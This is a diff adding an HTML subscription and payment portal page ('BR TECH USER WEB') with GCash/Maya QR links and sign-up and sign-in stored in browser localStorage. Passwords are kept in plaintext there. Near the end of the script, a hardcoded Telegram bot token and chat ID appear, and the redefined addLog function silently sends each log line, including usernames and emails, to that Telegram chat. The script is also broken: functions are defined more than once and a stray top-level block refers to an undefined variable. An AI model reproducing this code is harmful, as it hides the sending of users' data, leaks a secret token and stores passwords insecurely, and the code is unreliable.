@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover" />
+<title>Subscription Portal</title>
+<style>
+:root{
+  --bg1:#090909;
+  --bg2:#000;
+  --card1:#111111;
+  --card2:#1a1a1a;
+  --gold:#ffd84d;
+  --gold2:#d4af37;
+  --text:#f5f5f5;
+  --danger:#ff5b5b;
+  --ok:#22c55e;
+}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,sans-serif;}
+html,body{width:100%;min-height:100%;overflow-x:hidden;}
+body{
+  min-height:100svh;
+  color:var(--text);
+  background:radial-gradient(circle at top,#1a1404 0%,#090909 45%,#000 100%);
+  padding:16px;
+}
+.navbar{
+  width:min(100%, 440px);
+  margin:0 auto 14px;
+  background:linear-gradient(145deg,var(--card1),var(--card2) 55%,#0d0d0d);
+  border:1px solid rgba(255,215,0,0.35);
+  border-radius:18px;
+  padding:12px 14px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  gap:12px;
+  box-shadow:0 10px 24px rgba(0,0,0,.35);
+  position:relative;
+}
+
+.brand{
+  display:flex;
+  flex-direction:column;
+  line-height:1.2;
+  flex:1;
+  min-width:0;
+}
+.brand strong{color:var(--gold);font-size:16px;}
+.brand span{font-size:12px;color:#ddd;}
+.profile{
+  position:relative;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  flex-shrink:0;
+}
+
+.profile-info{
+  text-align:right;
+}
+
+@media (max-width:480px){
+  body{
+    padding:12px;
+  }
+
+  .navbar{
+    width:100%;
+    max-width:440px;
+    margin:0 auto 14px;
+    padding:12px;
+    flex-wrap:wrap;
+    justify-content:space-between;
+  }
+
+  .brand{
+    flex:1 1 100%;
+    text-align:center;
+    align-items:center;
+    margin-bottom:6px;
+  }
+
+  .profile{
+    width:100%;
+    justify-content:space-between;
+  }
+
+  .profile-info{
+    text-align:left;
+  }
+
+  .auth-dropdown{
+    left:0;
+    right:0;
+    width:100%;
+  }
+}
+.avatar{
+  width:40px;
+  height:40px;
+  border-radius:50%;
+  background:radial-gradient(circle at 30% 30%,#fff2b3,#ffd700 45%,#b8860b 100%);
+  color:#111;
+  font-weight:900;
+  display:grid;
+  place-items:center;
+  box-shadow:0 0 0 4px rgba(255,215,0,.08);
+  cursor:pointer;
+  user-select:none;
+}
+.auth-dropdown{
+  position:absolute;
+  right:0;
+  top:calc(100% + 10px);
+  min-width:170px;
+  background:linear-gradient(145deg,#111111,#1b1b1b 60%,#0d0d0d);
+  border:1px solid rgba(255,215,0,.35);
+  border-radius:14px;
+  padding:8px;
+  box-shadow:0 16px 30px rgba(0,0,0,.45);
+  z-index:1000;
+  display:none;
+}
+.auth-menu.open .auth-dropdown{display:block;}
+.auth-dropdown button{
+  width:100%;
+  display:block;
+  border:none;
+  background:transparent;
+  color:#fff;
+  padding:12px 14px;
+  border-radius:10px;
+  text-align:left;
+  font-weight:700;
+  cursor:pointer;
+}
+.auth-dropdown button:hover{
+  background:rgba(255,215,0,.12);
+  color:#ffd84d;
+}
+@media (hover:hover){
+  .auth-menu:hover .auth-dropdown{display:block;}
+}
+@media (max-width:480px){
+  .navbar{
+    flex-direction:column;
+    align-items:stretch;
+  }
+  .profile{
+    justify-content:space-between;
+    width:100%;
+  }
+  .auth-dropdown{
+    left:0;
+    right:0;
+    width:100%;
+  }
+}
+.shell{
+  width:min(100%, 440px);
+  margin:0 auto;
+  background:linear-gradient(145deg,var(--card1),var(--card2) 55%,#0d0d0d);
+  border:1px solid rgba(255,215,0,0.45);
+  border-radius:26px;
+  padding:22px;
+  text-align:center;
+  box-shadow:0 0 0 1px rgba(255,215,0,0.08),0 18px 50px rgba(0,0,0,0.7),0 0 42px rgba(255,215,0,0.12);
+  position:relative;
+  overflow:hidden;
+}
+.shell::before{
+  content:'';
+  position:absolute;
+  inset:0;
+  background:linear-gradient(135deg,rgba(255,215,0,0.08),transparent 35%,rgba(255,255,255,0.02));
+  pointer-events:none;
+}
+.hero{
+  width:100%;
+  aspect-ratio:16/9;
+  border-radius:18px;
+  overflow:hidden;
+  margin-bottom:18px;
+  border:1px solid rgba(255,215,0,0.28);
+  background:linear-gradient(135deg, rgba(255,215,0,0.22), rgba(0,0,0,0.05)), radial-gradient(circle at center, rgba(255,216,77,0.25), transparent 55%);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.icon{
+  width:76px;height:76px;
+  background:radial-gradient(circle at 30% 30%,#fff2b3,#ffd700 45%,#b8860b 100%);
+  color:#111;
+  font-size:34px;font-weight:800;
+  display:flex;justify-content:center;align-items:center;
+  border-radius:50%;
+  box-shadow:0 0 0 6px rgba(255,215,0,0.08),0 0 28px rgba(255,215,0,0.45);
+  animation:pulse 1.8s infinite;
+}
+@keyframes pulse{
+  0%{transform:scale(1);box-shadow:0 0 0 6px rgba(255,215,0,0.08),0 0 18px rgba(255,215,0,0.45);}
+  50%{transform:scale(1.05);box-shadow:0 0 0 10px rgba(255,215,0,0.12),0 0 34px rgba(255,215,0,0.9);}
+  100%{transform:scale(1);box-shadow:0 0 0 6px rgba(255,215,0,0.08),0 0 18px rgba(255,215,0,0.45);}
+}
+h1{color:var(--gold);margin:14px 0 10px;font-size:clamp(22px, 5vw, 28px);line-height:1.15;}
+p{color:#f3f3f3;margin-bottom:10px;font-size:clamp(13px, 3.4vw, 15px);line-height:1.5;}
+.note{color:var(--gold);font-weight:700;}
+.payment-row{display:flex;gap:10px;margin:18px 0 12px;flex-direction:row;}
+.pay-btn{
+  flex:1;
+  display:flex;justify-content:center;align-items:center;
+  min-height:52px;
+  padding:14px 12px;
+  border-radius:16px;
+  text-decoration:none;
+  color:#fff;
+  font-weight:700;
+  font-size:14px;
+  letter-spacing:.3px;
+  border:1px solid rgba(255,215,0,0.2);
+  box-shadow:0 8px 22px rgba(0,0,0,.35);
+}
+.gcash{background:linear-gradient(135deg,#d4af37 0%,#b8860b 48%,#7a5a00 100%);color:#111;}
+.maya{background:linear-gradient(135deg,#2a2a2a 0%,#4a3a1a 45%,#7d5f0b 100%);}
+.tutorial-btn,.action-btn{
+  display:block;
+  min-height:52px;
+  background:linear-gradient(135deg,#ffd84d 0%,#d4af37 48%,#8a6500 100%);
+  color:#111;
+  padding:15px;
+  border-radius:14px;
+  text-decoration:none;
+  font-weight:800;
+  margin-top:12px;
+  border:1px solid rgba(255,215,0,.35);
+  box-shadow:0 10px 24px rgba(0,0,0,.35);
+  cursor:pointer;
+  width:100%;
+}
+.gcash-box{
+  background:linear-gradient(135deg,#1b1608 0%,#2b2107 50%,#3d2e06 100%);
+  color:#ffd84d;
+  padding:16px;
+  border-radius:15px;
+  font-weight:700;
+  margin:16px 0 10px;
+  border:1px solid rgba(255,215,0,.35);
+  box-shadow:0 10px 24px rgba(0,0,0,.35),inset 0 1px 0 rgba(255,255,255,.04);
+}
+.contact{margin-top:8px;color:#fff;font-size:13px;}
+.contact span{color:#ffd84d;font-weight:700;word-break:break-word;}
+.footer{margin-top:14px;font-size:12px;color:#ffd84d;opacity:.92;}
+.error-box,.success-box{
+  display:none;
+  margin-top:14px;
+  padding:12px;
+  border-radius:12px;
+  font-size:14px;
+}
+.error-box{background:rgba(220,38,38,0.12);border:1px solid rgba(220,38,38,0.6);color:#fee2e2;}
+.success-box{background:rgba(34,197,94,0.12);border:1px solid rgba(34,197,94,0.6);color:#dcfce7;}
+.modal{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.72);
+  z-index:9999;
+  justify-content:center;
+  align-items:center;
+  padding:16px;
+  backdrop-filter:blur(4px);
+}
+.popup{
+  width:min(100%, 420px);
+  background:linear-gradient(145deg,#111111,#1b1b1b 60%,#0d0d0d);
+  border:1px solid rgba(255,215,0,.5);
+  border-radius:22px;
+  padding:22px 18px;
+  box-shadow:0 0 40px rgba(255,215,0,.18), 0 18px 40px rgba(0,0,0,.7);
+  position:relative;
+  animation:popupIn .22s ease-out;
+}
+@keyframes popupIn{from{transform:scale(.92);opacity:0;}to{transform:scale(1);opacity:1;}}
+.popup h2{color:#ffd84d;margin-bottom:12px;font-size:22px;text-align:center;}
+.popup p{color:#f3f3f3;font-size:14px;margin-bottom:14px;text-align:center;}
+.close-btn{
+  position:absolute;top:10px;right:10px;
+  width:36px;height:36px;border:none;border-radius:50%;
+  background:linear-gradient(135deg,#ffd84d,#d4af37);color:#111;
+  font-size:22px;font-weight:800;cursor:pointer;
+}
+.field{margin-bottom:10px;text-align:left;}
+.field label{display:block;color:#ffd84d;font-size:12px;margin-bottom:6px;}
+.field input{
+  width:100%;
+  background:#0f0f0f;
+  border:1px solid rgba(255,215,0,.25);
+  color:#fff;border-radius:12px;
+  padding:12px;outline:none;
+}
+.submit-btn{
+  width:100%;
+  min-height:48px;
+  border:none;
+  border-radius:14px;
+  margin-top:10px;
+  font-weight:800;
+  color:#111;
+  background:linear-gradient(135deg,#ffd84d 0%,#d4af37 48%,#8a6500 100%);
+  cursor:pointer;
+}
+.switch-row{
+  display:flex;
+  gap:10px;
+  margin-top:12px;
+}
+.switch-row button{
+  flex:1;
+  min-height:44px;
+  border:none;
+  border-radius:12px;
+  font-weight:800;
+  cursor:pointer;
+}
+.switch-row .active{background:linear-gradient(135deg,#ffd84d,#d4af37);color:#111;}
+.switch-row .ghost{background:#1a1a1a;color:#fff;border:1px solid rgba(255,215,0,.2);}
+.hidden{display:none !important;}
+.locked{opacity:.45;pointer-events:none;filter:grayscale(.2);}
+@media (min-width: 600px){
+  body{padding:24px;}
+  .shell{padding:28px 26px;border-radius:28px;}
+  .hero{aspect-ratio:16/8;}
+}
+@media (max-width: 360px){
+  .shell{padding:18px;border-radius:22px;}
+  .icon{width:68px;height:68px;font-size:30px;}
+  .payment-row{flex-direction:column;}
+}
+/* Shake animation */
+@keyframes shake {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-4px); }
+  40% { transform: translateX(4px); }
+  60% { transform: translateX(-4px); }
+  80% { transform: translateX(4px); }
+  100% { transform: translateX(0); }
+}
+
+/* When invalid: shake + red glow */
+.auth-menu.invalid-alert .auth-dropdown {
+  animation: shake 0.35s ease-in-out;
+  border-color: var(--danger);
+  box-shadow: 0 0 16px rgba(255, 91, 91, 0.6);
+}
+
+/* Also tint buttons red during the alert */
+.auth-menu.invalid-alert .auth-dropdown button {
+  color: #ffdcdc;
+}
+
+.auth-menu.invalid-alert .auth-dropdown button:hover {
+  background: rgba(255, 91, 91, 0.22);
+  color: #ffb3b3;
+}
+@keyframes form-shake {
+  0% { transform: translateX(0); }
+  20% { transform: translateX(-6px); }
+  40% { transform: translateX(6px); }
+  60% { transform: translateX(-6px); }
+  80% { transform: translateX(6px); }
+  100% { transform: translateX(0); }
+}
+
+/* Apply to the popup when there is an invalid attempt */
+.popup.invalid-alert {
+  animation: form-shake 0.35s ease-in-out;
+  border-color: var(--danger);
+  box-shadow:
+    0 0 0 1px rgba(255, 91, 91, 0.45),
+    0 0 20px rgba(255, 91, 91, 0.8),
+    0 18px 40px rgba(0, 0, 0, 0.7);
+}
+
+/* Optional: tint all inputs red during alert */
+.popup.invalid-alert .field input {
+  border-color: var(--danger);
+  box-shadow: 0 0 12px rgba(255, 91, 91, 0.6);
+}
+</style>
+</head>
+<body>
+ <audio id="alertSound" src="alert.mp3" preload="auto"></audio>
+<audio id="successSound" src="loginsucces.mp3" preload="auto"></audio>
+
+<div class="page">
+  <div class="navbar">
+    <div class="brand">
+      <strong>BR TECH USER WEB</strong>
+      <span>Secure access management</span>
+    </div>
+
+    <div class="profile auth-menu" id="authMenu">
+      <div class="profile-info">
+        <div class="name" id="profileName">Guest</div>
+        <div class="state" id="profileState">Not signed in</div>
+      </div>
+
+      <div class="avatar" id="avatarText" onclick="toggleAuthMenu()">G</div>
+
+    <div class="auth-dropdown" id="authDropdown">
+  <div id="navSignedOut">
+    <button type="button" onclick="showForm('signin')">Sign In</button>
+    <button type="button" onclick="showForm('signup')">Sign Up</button>
+  </div>
+  <div id="navSignedIn" class="hidden">
+    <button type="button" onclick="openProfileDashboard()">Profile Dashboard</button>
+    <button type="button" onclick="logout()">Logout</button>
+  </div>
+</div>
+    </div>
+  </div>
+
+  <div class="shell">
+    <div class="hero">
+      <div class="icon">S</div>
+    </div>
+
+    <h1 id="mainTitle">Create Your Access</h1>
+    <p id="mainText">Sign in or sign up to continue and unlock your subscription access.</p>
+    <p id="welcomeNote" class="note">Please sign in or create an account to continue.</p>
+
+    <div class="payment-row" id="paymentRow">
+      <a class="pay-btn gcash" href="gcash-qr.html">GCash QR</a>
+      <a class="pay-btn maya" href="maya-qr.html">Maya QR</a>
+    </div>
+
+    <button class="tutorial-btn" type="button" onclick="openTutorial()">OPEN PAYMENT TUTORIAL</button>
+
+    <button class="action-btn" type="button" onclick="openApp()">CLICK HERE!</button>
+
+    <div class="error-box" id="errorBox">No internet connection. Please connect to the internet first.</div>
+    <div class="success-box" id="successBox"></div>
+
+    <div class="contact">Contact Number: <span>09506849848</span></div>
+    <div class="contact">Facebook: <span>Ber Eal Izan</span></div>
+    <div class="footer">Renew now to get back online instantly!</div>
+  </div>
+</div>
+<div class="modal" id="profileModal">
+  <div class="popup">
+    <button class="close-btn" type="button" onclick="closeProfileDashboard()">×</button>
+    <h2>Profile Dashboard</h2>
+    <p>Update your avatar, name, and password.</p>
+
+    <form id="profileForm">
+      <div class="field">
+        <label for="profileAvatar">Avatar Letter</label>
+        <input type="text" id="profileAvatar" maxlength="1" placeholder="Initial (e.g. B)">
+      </div>
+
+      <div class="field">
+        <label for="profileName">Display Name</label>
+        <input type="text" id="profileName" required>
+      </div>
+
+      <div class="field">
+        <label for="profileUsername">Username</label>
+        <input type="text" id="profileUsername" readonly>
+      </div>
+
+      <div class="field">
+        <label for="profileEmail">Email</label>
+        <input type="email" id="profileEmail" readonly>
+      </div>
+
+      <div class="field">
+        <label for="profilePassword">New Password</label>
+        <input type="password" id="profilePassword" placeholder="Leave blank to keep current">
+      </div>
+
+      <button class="submit-btn" type="submit">Save Changes</button>
+    </form>
+  </div>
+</div>
+<div class="modal" id="authModal">
+  <div class="popup">
+    <button class="close-btn" type="button" onclick="closeAuth()">×</button>
+    <h2 id="authTitle">Sign In</h2>
+    <p id="authSubtitle">Access your account to continue.</p>
+
+    <div class="switch-row">
+      <button id="btnSignIn" class="active" type="button" onclick="showForm('signin')">Sign In</button>
+      <button id="btnSignUp" class="ghost" type="button" onclick="showForm('signup')">Sign Up</button>
+    </div>
+
+    <form id="signinForm">
+      <div class="field">
+        <label for="signinUser">Username or Email</label>
+        <input type="text" id="signinUser" required>
+      </div>
+      <div class="field">
+        <label for="signinPass">Password</label>
+        <input type="password" id="signinPass" required>
+      </div>
+      <button class="submit-btn" type="submit">Sign In</button>
+    </form>
+
+    <form id="signupForm" class="hidden">
+      <div class="field">
+        <label for="signupName">Full Name</label>
+        <input type="text" id="signupName" required>
+      </div>
+      <div class="field">
+        <label for="signupUser">Username</label>
+        <input type="text" id="signupUser" required>
+      </div>
+      <div class="field">
+        <label for="signupEmail">Email</label>
+        <input type="email" id="signupEmail" required>
+      </div>
+      <div class="field">
+        <label for="signupPass">Password</label>
+        <input type="password" id="signupPass" required>
+      </div>
+      <button class="submit-btn" type="submit">Create Account</button>
+    </form>
+  </div>
+</div>
+
+<div class="modal" id="tutorialOverlay">
+  <div class="popup">
+    <button class="close-btn" type="button" onclick="closeTutorial()">×</button>
+    <h2>Payment Tutorial</h2>
+    <p>Choose your payment method and follow the steps carefully.</p>
+    <div class="field" style="color:#fff">1. Tap GCash QR or Maya QR.</div>
+    <div class="field" style="color:#fff">2. Scan the QR code using your payment app.</div>
+    <div class="field" style="color:#fff">3. Send the exact amount shown by your subscription.</div>
+    <div class="field" style="color:#fff">4. Wait for confirmation before reconnecting.</div>
+
+    <button class="submit-btn" type="button" onclick="downloadLogs()" style="margin-top:14px;">Download Logs</button>
+  </div>
+</div>
+<script>
+  const profileModal = document.getElementById('profileModal');
+
+function openProfileDashboard() {
+  const currentUser = getCurrentUser();
+  if (!currentUser) return;
+
+  // Pre-fill fields from currentUser + stored password
+  const users = getUsers();
+  const account = users.find(u => u.username === currentUser.username && u.email === currentUser.email);
+  const avatarLetter = (avatarText.textContent || '').trim();
+
+  document.getElementById('profileAvatar').value = avatarLetter || (currentUser.name?.trim()[0] || '').toUpperCase();
+  document.getElementById('profileName').value = currentUser.name || '';
+  document.getElementById('profileUsername').value = currentUser.username || '';
+  document.getElementById('profileEmail').value = currentUser.email || '';
+  document.getElementById('profilePassword').value = '';
+
+  profileModal.style.display = 'flex';
+}
+
+function closeProfileDashboard() {
+  profileModal.style.display = 'none';
+}
+const authModal = document.getElementById('authModal');
+const authPopup = document.querySelector('#authModal .popup');
+const alertAudio = document.getElementById('alertSound');
+
+function triggerInvalidFormAlert() {
+  if (!authPopup) return;
+
+  // Ensure the modal is visible so user sees the effect
+  authModal.style.display = 'flex';
+
+  // Add class to trigger CSS animation and red state
+  authPopup.classList.add('invalid-alert');
+
+  // Remove the class when animation finishes, so it can be re-used
+  authPopup.addEventListener('animationend', function handler() {
+    authPopup.classList.remove('invalid-alert');
+    authPopup.removeEventListener('animationend', handler);
+  });
+
+  // Play alert sound
+  if (alertAudio) {
+    alertAudio.currentTime = 0;
+    alertAudio.play().catch(() => {});
+  }
+}
+const tutorialOverlay = document.getElementById('tutorialOverlay');
+const paymentRow = document.getElementById('paymentRow');
+const profileName = document.getElementById('profileName');
+const profileState = document.getElementById('profileState');
+const avatarText = document.getElementById('avatarText');
+const errorBox = document.getElementById('errorBox');
+const successBox = document.getElementById('successBox');
+const authMenu = document.getElementById('authMenu');
+const mainTitle = document.getElementById('mainTitle');
+const mainText = document.getElementById('mainText');
+const welcomeNote = document.getElementById('welcomeNote');
+document.getElementById('profileForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const currentUser = getCurrentUser();
+  if (!currentUser) return;
+
+  const avatarInput = document.getElementById('profileAvatar').value.trim();
+  const newName = document.getElementById('profileName').value.trim();
+  const username = document.getElementById('profileUsername').value.trim();
+  const email = document.getElementById('profileEmail').value.trim();
+  const newPassword = document.getElementById('profilePassword').value;
+
+  if (!newName) {
+    errorBox.style.display = 'block';
+    errorBox.textContent = 'Display name cannot be empty.';
+    triggerInvalidFormAlert();
+    return;
+  }
+
+  // Update users array in localStorage
+  const users = getUsers();
+  const index = users.findIndex(u => u.username === username && u.email === email);
+
+  if (index === -1) {
+    errorBox.style.display = 'block';
+    errorBox.textContent = 'Account not found in storage.';
+    triggerInvalidFormAlert();
+    return;
+  }
+
+  users[index].name = newName;
+  if (newPassword) {
+    users[index].password = newPassword;
+  }
+
+  localStorage.setItem('portalUsers', JSON.stringify(users));
+
+  // Update currentUser object and navbar/avatar
+  const updatedUser = {
+    name: newName,
+    username,
+    email
+  };
+  setCurrentUser(updatedUser, false);
+
+  // Update avatar letter if provided
+  if (avatarInput) {
+    avatarText.textContent = avatarInput.toUpperCase();
+  } else {
+    avatarText.textContent = (newName.trim()[0] || 'U').toUpperCase();
+  }
+
+  // Log, notify, and close
+  addLog(`PROFILE UPDATE: ${username}`);
+  successBox.style.display = 'block';
+  successBox.textContent = 'Profile updated successfully.';
+  playSuccessSound();
+  closeProfileDashboard();
+});
+
+function showAuth() { authModal.style.display = 'flex'; }
+function closeAuth() { authModal.style.display = 'none'; }
+function openTutorial() { tutorialOverlay.style.display = 'flex'; }
+function closeTutorial() { tutorialOverlay.style.display = 'none'; }
+
+function showForm(mode){
+  document.getElementById('signinForm').classList.toggle('hidden', mode !== 'signin');
+  document.getElementById('signupForm').classList.toggle('hidden', mode !== 'signup');
+  document.getElementById('btnSignIn').classList.toggle('active', mode === 'signin');
+  document.getElementById('btnSignIn').classList.toggle('ghost', mode !== 'signin');
+  document.getElementById('btnSignUp').classList.toggle('active', mode === 'signup');
+  document.getElementById('btnSignUp').classList.toggle('ghost', mode !== 'signup');
+  document.getElementById('authTitle').textContent = mode === 'signin' ? 'Sign In' : 'Sign Up';
+  document.getElementById('authSubtitle').textContent = mode === 'signin' ? 'Access your account to continue.' : 'Create your account first.';
+  showAuth();
+}
+function triggerInvalidAuthAlert() {
+  const dropdown = document.getElementById('authDropdown');
+  const sound = document.getElementById('alertSound');
+
+  // Ensure dropdown is visible so the user sees the effect
+  authMenu.classList.add('open');
+
+  // Add the invalid class to trigger CSS animation
+  authMenu.classList.add('invalid-alert');
+
+  // Remove the class after animation ends so it can be reused
+  dropdown.addEventListener('animationend', function handler() {
+    authMenu.classList.remove('invalid-alert');
+    dropdown.removeEventListener('animationend', handler);
+  });
+
+  // Play alert sound (catch to avoid console errors if blocked)
+  if (sound) {
+    sound.currentTime = 0;
+    sound.play().catch(() => {});
+  }
+}
+function getUsers(){
+  try { return JSON.parse(localStorage.getItem('portalUsers') || '[]'); }
+  catch { return []; }
+}
+
+function getCurrentUser(){
+  try { return JSON.parse(localStorage.getItem('portalUser')); }
+  catch { return null; }
+}
+
+function getLogs(){
+  return localStorage.getItem('portalLogs') || '';
+}
+
+function addLog(message){
+  const time = new Date().toLocaleString();
+  const line = `[${time}] ${message}\n`;
+  localStorage.setItem('portalLogs', getLogs() + line);
+}
+
+function downloadLogs(){
+  const blob = new Blob([getLogs()], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'portal-logs.txt';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+
+function setCurrentUser(user, isNew = false){
+  localStorage.setItem('portalUser', JSON.stringify(user));
+  refreshUI(isNew);
+}
+
+function logout(){
+  const user = getCurrentUser();
+  if (user?.username) addLog(`LOGOUT: ${user.username}`);
+  localStorage.removeItem('portalUser');
+  refreshUI(false);
+  successBox.style.display = 'block';
+  successBox.textContent = 'You have been logged out.';
+}
+
+function refreshUI(isJustSignedIn = false){
+  const user = getCurrentUser();
+
+  if (user && user.name){
+    profileName.textContent = user.name;
+    profileState.textContent = 'Signed in';
+    avatarText.textContent = (user.name.trim()[0] || 'U').toUpperCase();
+    paymentRow.classList.remove('locked');
+
+    mainTitle.textContent = `Welcome, ${user.name}!`;
+    mainText.textContent = isJustSignedIn
+      ? 'Thanks for registering. Your account is ready.'
+      : 'Thanks for coming back. Your access is active.';
+    welcomeNote.textContent = isJustSignedIn
+      ? 'Thank you for signing up with us.'
+      : 'You are signed in successfully.';
+
+    successBox.style.display = 'block';
+    successBox.textContent = isJustSignedIn
+      ? 'Account created successfully. Welcome!'
+      : 'Signed in successfully.';
+
+    document.getElementById('navSignedOut').classList.add('hidden');
+    document.getElementById('navSignedIn').classList.remove('hidden');
+  } else {
+    profileName.textContent = 'Guest';
+    profileState.textContent = 'Not signed in';
+    avatarText.textContent = 'G';
+    paymentRow.classList.add('locked');
+
+    mainTitle.textContent = 'Join the Portal';
+    mainText.textContent = 'Sign in or sign up to unlock access and continue.';
+    welcomeNote.textContent = 'Please sign in or create an account to continue.';
+
+    document.getElementById('navSignedOut').classList.remove('hidden');
+    document.getElementById('navSignedIn').classList.add('hidden');
+  }
+}
+
+document.getElementById('signupForm').addEventListener('submit', function(e){
+  e.preventDefault();
+
+  const user = {
+    name: document.getElementById('signupName').value.trim(),
+    username: document.getElementById('signupUser').value.trim(),
+    email: document.getElementById('signupEmail').value.trim(),
+    password: document.getElementById('signupPass').value
+  };
+if (!user.name || !user.username || !user.email || !user.password) {
+  errorBox.style.display = 'block';
+  errorBox.textContent = 'Please fill in all required fields.';
+  triggerInvalidFormAlert();
+  return;
+}
+
+  const users = getUsers();
+  const exists = users.some(u =>
+    u.username.toLowerCase() === user.username.toLowerCase() ||
+    u.email.toLowerCase() === user.email.toLowerCase()
+  );
+
+if (exists) {
+  errorBox.style.display = 'block';
+  errorBox.textContent = 'Username or email already exists.';
+  triggerInvalidFormAlert();
+  return;
+}
+users.push(user);
+localStorage.setItem('portalUsers', JSON.stringify(users));
+setCurrentUser({ name: user.name, username: user.username, email: user.email }, true);
+addLog(`SIGN UP: ${user.username} (${user.email})`);
+closeAuth();
+errorBox.style.display = 'none';
+playSuccessSound();
+});
+
+document.getElementById('signinForm').addEventListener('submit', function(e){
+  e.preventDefault();
+
+  const input = document.getElementById('signinUser').value.trim();
+  const pass = document.getElementById('signinPass').value;
+  const users = getUsers();
+
+  const account = users.find(u =>
+    (u.username === input || u.email === input) && u.password === pass
+  );
+
+if (account) {
+  setCurrentUser({ name: account.name, username: account.username, email: account.email }, false);
+  addLog(`SIGN IN: ${account.username}`);
+  closeAuth();
+  errorBox.style.display = 'none';
+  playSuccessSound();
+} else {
+  errorBox.style.display = 'block';
+  errorBox.textContent = 'Invalid login details.';
+  triggerInvalidFormAlert();
+}
+});
+
+function openApp() {
+  if (!navigator.onLine) {
+    errorBox.style.display = 'block';
+    errorBox.textContent = 'No internet connection. Please connect to the internet first.';
+    addLog('OFFLINE ATTEMPT: payment action blocked');
+    return;
+  }
+  if (!getCurrentUser()) {
+    showAuth();
+    showForm('signin');
+    return;
+  }
+  window.location.href = 'gcash-qr.html';
+}
+
+window.addEventListener('offline', () => {
+  errorBox.style.display = 'block';
+  errorBox.textContent = 'No internet connection. Please connect to the internet first.';
+});
+window.addEventListener('online', () => {
+  errorBox.style.display = 'none';
+});
+
+document.addEventListener('DOMContentLoaded', function(){
+  refreshUI(false);
+  if (!navigator.onLine) errorBox.style.display = 'block';
+});
+
+function toggleAuthMenu() {
+  authMenu.classList.toggle('open');
+}
+
+document.addEventListener('click', function(e) {
+  if (!authMenu.contains(e.target)) {
+    authMenu.classList.remove('open');
+  }
+});
+let logFileHandle = null;
+
+async function saveLogsToDrive() {
+  const logText = localStorage.getItem('portalLogs') || '';
+
+  if (!('showSaveFilePicker' in window)) {
+    downloadLogs();
+    return;
+  }
+
+  try {
+    if (!logFileHandle) {
+      logFileHandle = await window.showSaveFilePicker({
+        suggestedName: 'portal-logs.txt',
+        types: [{
+          description: 'Text File',
+          accept: { 'text/plain': ['.txt'] }
+        }]
+      });
+    }
+
+    const file = await logFileHandle.getFile();
+    const writable = await logFileHandle.createWritable({ keepExistingData: true });
+
+    await writable.write({ type: 'seek', position: file.size });
+    await writable.write({ type: 'write', data: logText + '\n' });
+    await writable.close();
+
+    successBox.style.display = 'block';
+    successBox.textContent = 'Logs appended to your file.';
+  } catch (err) {
+    if (err.name !== 'AbortError') {
+      errorBox.style.display = 'block';
+      errorBox.textContent = 'Could not append logs to drive.';
+    }
+  }
+}
+const TELEGRAM_BOT_TOKEN = '8365276963:AAFaxEw-7oYe-wNduSXLIboJW85xu9YHhw0';
+const TELEGRAM_CHAT_ID = '6901776323';
+async function mirrorToTelegram(message) {
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    });
+  } catch (err) {
+    console.warn('Telegram log mirror failed', err);
+  }
+}
+function getLogs() {
+  return localStorage.getItem('portalLogs') || '';
+}
+
+function addLog(message) {
+  const time = new Date().toLocaleString();
+  const line = `[${time}] ${message}\n`;
+  localStorage.setItem('portalLogs', getLogs() + line);
+}
+
+function downloadLogs() {
+  const blob = new Blob([getLogs()], { type: 'text/plain' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'portal-logs.txt';
+  a.click();
+  URL.revokeObjectURL(url);
+}
+function addLog(message){
+  const time = new Date().toLocaleString();
+  const line = `[${time}] ${message}\n`;
+  localStorage.setItem('portalLogs', (localStorage.getItem('portalLogs') || '') + line);
+  mirrorToTelegram(line);
+}
+function triggerInvalidAuthAlert() {
+  const dropdown = document.getElementById('authDropdown');
+  const sound = document.getElementById('alertSound');
+
+  // Ensure dropdown is visible so the user sees the effect
+  authMenu.classList.add('open');
+
+  // Add the invalid class to trigger CSS animation
+  authMenu.classList.add('invalid-alert');
+
+  // Remove the class after animation ends so it can be reused
+  dropdown.addEventListener('animationend', function handler() {
+    authMenu.classList.remove('invalid-alert');
+    dropdown.removeEventListener('animationend', handler);
+  });
+
+  // Play alert sound (catch to avoid console errors if blocked)
+  if (sound) {
+    sound.currentTime = 0;
+    sound.play().catch(() => {});
+  }
+}
+if (account) {
+  setCurrentUser({ name: account.name, username: account.username, email: account.email }, false);
+  addLog(`SIGN IN: ${account.username}`);
+  closeAuth();
+  errorBox.style.display = 'none';
+} else {
+  errorBox.style.display = 'block';
+  errorBox.textContent = 'Invalid login details.';
+  triggerInvalidFormAlert();
+}
+const successAudio = document.getElementById('successSound');
+
+function playSuccessSound() {
+  if (!successAudio) return;
+  successAudio.currentTime = 0;
+  successAudio.play().catch(() => {});
+}
+</script>
+</body>
+</html>
